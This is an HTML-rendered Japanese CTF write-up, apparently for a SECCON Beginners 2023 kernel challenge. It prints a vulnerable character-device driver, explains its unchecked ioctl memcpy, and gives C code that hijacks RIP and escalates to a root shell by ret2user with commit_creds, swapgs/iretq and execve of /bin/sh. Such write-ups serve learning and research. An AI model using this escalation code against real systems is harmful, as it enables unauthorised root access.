<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"ctf4b.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span>

<span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"pwnyaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"SECCON Beginners CTF 2023 Online"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">char</span> g_message<span class="token punctuation">[</span>CTF4B_MSG_SIZE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Welcome to SECCON Beginners CTF 2023!"</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * Open this driver
 */</span>
<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * Close this driver
 */</span>
<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * Handle ioctl request
 */</span>
<span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">module_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">;</span>

  <span class="token keyword">switch</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> CTF4B_IOCTL_STORE<span class="token operator">:</span>
      <span class="token comment">/* Store message */</span>
      <span class="token function">memcpy</span><span class="token punctuation">(</span>g_message<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> CTF4B_MSG_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>

    <span class="token keyword">case</span> CTF4B_IOCTL_LOAD<span class="token operator">:</span>
      <span class="token comment">/* Load message */</span>
      <span class="token function">memcpy</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> g_message<span class="token punctuation">,</span> CTF4B_MSG_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>

    <span class="token keyword">default</span><span class="token operator">:</span>
      <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>unlocked_ioctl <span class="token operator">=</span> module_ioctl<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>open <span class="token operator">=</span> module_open<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> CTF4B_DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>

  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>
  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<p>このモジュールのコードを読むと、末尾で以下の関数が呼び出されていることがわかります。</p>
<p>ここではモジュールの初期化と終了時の処理が定義されます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<p>終了処理は一旦無視し、初期化処理を確認してみます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> CTF4B_DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>

  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>
  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>ここでは、<code class="language-text">cdev_init</code> と <code class="language-text">cdev_add</code> でモジュールのインターフェースを定義しています。</p>
<p>参考：<a href="https://qiita.com/iwatake2222/items/6b02494a3668f79800e6#%E5%8B%95%E7%9A%84%E3%81%AB%E3%83%A1%E3%82%B8%E3%83%A3%E3%83%BC%E7%95%AA%E5%8F%B7%E3%82%92%E5%89%B2%E3%82%8A%E5%BD%93%E3%81%A6%E3%81%A6%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AB%E7%99%BB%E9%8C%B2%E3%81%99%E3%82%8B" target="_blank" rel="nofollow noopener noreferrer">動的にメジャー番号を割り当てて、カーネルに登録する</a></p>
<p>この時 <code class="language-text">cdev_init</code> に与えられている <code class="language-text">&amp;module_fops</code> は、作成したインターフェース(キャラクタデバイス)に対してシステムコールが発行された場合に行う処理の関数テーブルにあたります。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>unlocked_ioctl <span class="token operator">=</span> module_ioctl<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>open <span class="token operator">=</span> module_open<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></div>
<p>今回着目するのは、<code class="language-text">ioctl</code> がコールされた場合に呼び出される処理を定義した <code class="language-text">unlocked_ioctl</code> の行です。</p>
<p>参考：<a href="https://qiita.com/akachochin/items/94ba679b2941f55c1d2d" target="_blank" rel="nofollow noopener noreferrer">Linuxのunlocked<em>ioctlとcompat</em>ioctlの違い - Qiita</a></p>
<p>ここから、作成したキャラクタデバイスに対して <code class="language-text">ioctl</code> がコールされると以下の処理が呼び出されることがわかります。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">/**
 * Handle ioctl request
 */</span>
<span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">module_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">;</span>

  <span class="token keyword">switch</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> CTF4B_IOCTL_STORE<span class="token operator">:</span>
      <span class="token comment">/* Store message */</span>
      <span class="token function">memcpy</span><span class="token punctuation">(</span>g_message<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> CTF4B_MSG_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>

    <span class="token keyword">case</span> CTF4B_IOCTL_LOAD<span class="token operator">:</span>
      <span class="token comment">/* Load message */</span>
      <span class="token function">memcpy</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> g_message<span class="token punctuation">,</span> CTF4B_MSG_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>

    <span class="token keyword">default</span><span class="token operator">:</span>
      <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>どうやらこの関数が攻撃の起点になりそうです。</p>
<h3 id="module_ioctl-を読む" style="position:relative;"><a href="#module_ioctl-%E3%82%92%E8%AA%AD%E3%82%80" aria-label="module_ioctl を読む permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>module_ioctl を読む</h3>
<p><code class="language-text">module_ioctl</code> 関数の定義を見ると、 <code class="language-text">ioctl</code> の第 2 引数に CTF4B<em>IOCTL</em>STORE(0xC7F4B00) が与えられた場合は、続く  <code class="language-text">ioctl</code> の第 3 引数の値をグローバル変数 <code class="language-text">g_message</code> の領域に <code class="language-text">memcpy</code> することがわかります。</p>
<p>また  <code class="language-text">ioctl</code> の第 2 引数に CTF4B<em>IOCTL</em>LOAD(0xC7F4B01) が与えられた場合は、逆に <code class="language-text">g_message</code> の値がローカル変数 <code class="language-text">msg</code> にコピーされます。</p>
<p>処理としてはシンプルですが、CTF4B<em>IOCTL</em>LOAD の処理を呼び出した場合、任意のアドレスに対して <code class="language-text">g_message</code> の値を埋め込むことができるようになることがわかります。</p>
<p>ここで、先ほど確認した通り今回の環境では SMAP、SMEP や KASLR は無効化されています。</p>
<p>つまり、gdb で特定した ret 時のスタックを改ざんして RIP を奪取したり、ユーザランドのメモリを書き換えるなどやりたい放題できるようになるわけです。</p>
<p>実際に、以下のコードで作成したペイロードを使用することで、 TARGET で指定した ret 時の RSP を改ざんし、 RIP を奪取することに成功しました。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token keyword">int</span> fd<span class="token punctuation">;</span>
fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ctf4b"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"/dev/ctf4b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CTF4B_IOCTL_STORE<span class="token punctuation">,</span> <span class="token string">"AAAAAAAA"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"ioctl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CTF4B_IOCTL_LOAD<span class="token punctuation">,</span> TARGET<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"ioctl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 827px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/cf0a33e7444730589abd3a1073fc6278/4e6ec/image-20230607203550475.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 134.16666666666669%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAbCAYAAAB836/YAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEt0lEQVRIx31WWVvaWhTl5VpRZBRxqJaZkJkQIAkYxoAgpajUqa2trb23Ptzvu///Zd19DqnawT6sb5/kM9t19llrHQJmooKJ7GEk9DDTx1hYc9jbJsy4CiOmwNoxoMcMyOsS1LUSQXhSn6zXy9DWBQQ6+yZuOme4cma4G13j39M7uC8N1LZl2FsKOpkanG0FtaiAekJEY1Oif6jyNX8mVNbz0INZQg6B7kEdV8053tanuOme4372GZ10A57owggVoQXpj9d8rBfo4wKvT9+xqvkIWAkZH9qnuLJf48vwAv8t7uBlLZwZR9QsB2Ul8/gx+4je/Q66j0A77aJ54NIWW7D2e3DSHioJC+6rFtx9B1bKhBgyIK6KkFdpXuvib1AmSLwG7qcfUN/3kNnoIxufIR17g3z8CL2MQ7Nd4Na7xIX1GqfVI3T2a1BXsz7bR1YMD1u+7S9gHQxQiA5QTM5QSM5Rig9wuFfDeWOKT/0LvHfP8PfxDcZCG/JK+oeZ/YzA/fE7WOkRcpEh8skT5JJnKMbHxKaOd605zfWKq+Dr0TW8nE0zTf/Cbgn/lBd0uvVdF+WwAyHWQzFGTGNtNGh2x/IQr7UxxhJVfYLWXgNKsER6YzMTfkKZazLgZkdo7buwN1SUY11UkjYaGQWN3Qpc2ra+VoD01yu+VWWVbavwDIocATuso0nNjHAFUthAJaKhGpE51GARakiGHK5C2dC4Exgb7QmeMtQYQ63IttaHGRF8JhnIL3LUjIm4uPwoJC0bEBP2XiWmig/2vGRXWjLUBQNzfYhh4ZDLopu2cbhb5WKVVvKEHIe4sjxFM1wiG5ZRj5H1qDIiTw+HN5TibYhbY4jbbyDsnEFJ9snPdXSKY3SLpL/iBD15wUOjldLQI2sO8y0MsjYn8d1BrAb0chVSgvS1PYH48hzS3ik17GFSbuPb8XsKjCvc9ha4tCZwksrycF5keP2+/t5M4wxzOk60IY5Kh+ge1NDPWLRlA+2XJmfRTOk8EH4Iid/gkWFeRy/fhxqtoRSsQAhqkIISn5W7V4WdVB/s9hAEf2gc0AsVmDsd0mAHhZgHgWwnRR3uipnmwdpUnmX3s+14w0qpAi3ZQeXgDcTdU+SjI4gxF1Oxjbcmm5sKfTXzYK0fIms1+3jCtOYzVPJVtPIWDX2OXrEFeZMslJJ5lbYoshLsWYNKKa1uSXBoFD3SpxkrQ9lRoCYptlKk010V1aiIQI1yrkGitAitkAA7LJINy2iFKepDIhwStB6qQlhTIbO7g5yjsewjsSsbMpQQA1sr/F3gwjmhcGijFHFpfh5F1whCtEP3iImpNMCpOcVJ7YQusAnXphJk7in5zig9OGR5WZH1/plcw3rF4suj+Jr78TVE248vdnHd0BXxbXrDtan4efhrfPlO+eKdU8BSswiFLAUsa8oaMjaX9gwfe+e4bp3gdnDJNcqE/MeA/Tq6RIOugGx0yBvmNqkhnbS7V+fR/9FP7M/eFUmp6TcsPN9wWD6CQ3moBxWIkSakWBPyjolqykA/14azU0eNfgw0tqowIiqUtfKfL6n6bgfmpo3BQRdK4hDVTRPOHp1wSkUjLvG5MFYq8yx3TO7Z+TGG/wOg8CX1oSiKkQAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/cf0a33e7444730589abd3a1073fc6278/8ac56/image-20230607203550475.webp 240w,
/static/cf0a33e7444730589abd3a1073fc6278/d3be9/image-20230607203550475.webp 480w,
/static/cf0a33e7444730589abd3a1073fc6278/97d4f/image-20230607203550475.webp 827w"
              sizes="(max-width: 827px) 100vw, 827px"
              type="image/webp"
            />
          <source
            srcset="/static/cf0a33e7444730589abd3a1073fc6278/8ff5a/image-20230607203550475.png 240w,
/static/cf0a33e7444730589abd3a1073fc6278/e85cb/image-20230607203550475.png 480w,
/static/cf0a33e7444730589abd3a1073fc6278/4e6ec/image-20230607203550475.png 827w"
            sizes="(max-width: 827px) 100vw, 827px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/cf0a33e7444730589abd3a1073fc6278/4e6ec/image-20230607203550475.png"
            alt="image-20230607203550475"
            title="image-20230607203550475"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h3 id="root-権限で-shell-を取得するret2user" style="position:relative;"><a href="#root-%E6%A8%A9%E9%99%90%E3%81%A7-shell-%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8Bret2user" aria-label="root 権限で shell を取得するret2user permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>root 権限で Shell を取得する(ret2user)</h3>
<p>無事に RIP を奪取できたので、root 権限の Shell 取得を目指します。</p>
<p>以下の記事を参考にしたところ、SMEP が無効な場合はユーザ空間のコード実行を利用して ret2user という手法で root 権限の Shell を取得できるようです。</p>
<p>参考：<a href="https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html" target="_blank" rel="nofollow noopener noreferrer">Holstein v1: Stack Overflowの悪用 | PAWNYABLE!</a></p>
<p>ret2user では、ユーザ空間で以下のように定義した escalate_privilege 関数をカーネル空間から呼び出すことで権限昇格を行います。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] win!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">restore_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"swapgs ;"</span>
               <span class="token string">"movq %0, 0x20(%%rsp)\t\n"</span>
               <span class="token string">"movq %1, 0x18(%%rsp)\t\n"</span>
               <span class="token string">"movq %2, 0x10(%%rsp)\t\n"</span>
               <span class="token string">"movq %3, 0x08(%%rsp)\t\n"</span>
               <span class="token string">"movq %4, 0x00(%%rsp)\t\n"</span>
               <span class="token string">"iretq"</span>
               <span class="token operator">:</span>
               <span class="token operator">:</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span>
                 <span class="token string">"r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span>
                 <span class="token string">"r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span><span class="token punctuation">,</span>
                 <span class="token string">"r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>win<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">escalate_privilege</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>pkc<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>cc<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">(</span><span class="token operator">*</span>cc<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>pkc<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">restore_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>最終的に、commit_creds 関数を使用して権限を昇格した状態で win 関数に飛ばすことで Shell を取得します。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 850px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/9c8ba7b03953bfeb10787c8f22e589ca/645e0/Privilege-Escalation-Procedure-through-commit-creds.ppm"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
